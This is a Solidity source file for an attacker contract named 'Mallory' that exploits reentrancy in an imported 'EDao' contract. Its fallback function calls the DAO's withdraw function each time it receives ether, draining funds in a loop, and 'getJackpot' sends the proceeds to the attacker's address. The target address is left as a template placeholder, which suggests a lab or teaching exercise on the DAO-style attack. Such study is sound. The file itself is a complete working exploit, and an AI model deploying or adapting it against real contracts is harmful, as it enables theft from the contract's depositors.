pragma solidity ^0.5.12;
import './EDao.sol';

contract Mallory {
    address payable owner;
    EDao public dao = EDao(##EdaoSmartContractAddress##);

    constructor() public{owner = msg.sender; }

    function getJackpot()public { owner.transfer(address(this).balance); }

    function() external payable { dao.withdraw(address(this), 1000000000000000000); }

}   
